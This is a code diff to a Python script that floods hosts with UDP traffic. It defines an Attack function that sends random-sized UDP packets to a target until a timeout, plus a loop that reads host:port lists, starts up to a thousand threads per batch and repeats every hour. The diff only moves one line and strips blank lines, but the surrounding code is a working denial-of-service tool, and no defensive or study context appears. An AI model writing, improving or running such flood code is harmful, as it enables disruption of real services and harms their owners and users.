@@ -15,7 +15,6 @@ def Attack(target, port, kbytes, timeout):
         sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sent = 0
         while time.time()<timeout:
-            
             b = Bytes*random.randint(1,22)
             sock.sendto(b,(target,port))
             sent=sent + 1
@@ -36,11 +35,7 @@ while 1 == 1:
             count_targets = len(rrow)
             count_threads = int(1000//count_targets)
             for r in rrow:
+                trgt = r.split(":")
                 for i in range(count_threads):
-                    trgt = r.split(":")
                     threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
     time.sleep(3600)
- 
- 
-            
-    
